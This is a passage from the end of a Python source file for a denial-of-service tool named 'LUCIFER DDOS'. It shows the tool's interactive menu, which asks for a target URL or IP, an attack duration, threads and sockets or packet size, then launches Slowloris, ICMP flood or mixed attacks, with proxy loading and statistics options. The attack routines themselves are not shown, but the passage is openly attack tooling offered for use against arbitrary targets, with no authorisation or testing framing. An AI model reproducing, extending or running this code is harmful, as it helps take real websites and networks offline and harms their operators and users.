                print(f"\n{CYAN}[=== SLOWLORIS CONFIGURATION ===]{RESET}")
                target = input("[?] Enter target URL: ").strip()
                try:
                    duration = int(input("[?] Enter attack duration (seconds): "))
                    threads = int(input("[?] Enter threads (default 10): ") or "10")
                    sockets = int(input("[?] Enter sockets per thread (default 10): ") or "10")

                    self.slowloris_attack(target, duration, threads, sockets)
                except ValueError:
                    print(f"{RED}[-] Invalid input!{RESET}")

            elif choice == '5':
                print(f"\n{CYAN}[=== ICMP FLOOD CONFIGURATION ===]{RESET}")
                target = input("[?] Enter target IP: ").strip()
                try:
                    duration = int(input("[?] Enter attack duration (seconds): "))
                    threads = int(input("[?] Enter threads (default 20): ") or "20")
                    packet_size = int(input("[?] Enter packet size (default 64): ") or "64")

                    self.icmp_flood(target, duration, threads, packet_size)
                except ValueError:
                    print(f"{RED}[-] Invalid input!{RESET}")

            elif choice == '6':
                print(f"\n{CYAN}[=== MIXED ATTACK CONFIGURATION ===]{RESET}")
                target = input("[?] Enter target URL/IP: ").strip()
                try:
                    duration = int(input("[?] Enter attack duration (seconds): "))
                    threads = int(input("[?] Enter threads (default 30): ") or "30")

                    self.mixed_attack(target, duration, threads)
                except ValueError:
                    print(f"{RED}[-] Invalid input!{RESET}")

            elif choice == '7':
                self.load_proxies()

            elif choice == '8':
                self.show_stats()
                input(f"{YELLOW}Press Enter to continue...{RESET}")

            elif choice == '9':
                self.about()
                input(f"{YELLOW}Press Enter to continue...{RESET}")

            elif choice == '0':
                print(f"{GREEN}[+] Thank you for using LUCIFER DDOS!{RESET}")
                sys.exit(0)

            else:
                print(f"{RED}[-] Invalid choice!{RESET}")
                time.sleep(1)


def main():
    try:
        tools = DDoSTools()
        tools.main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Program terminated by user{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}[!] Error: {e}{RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
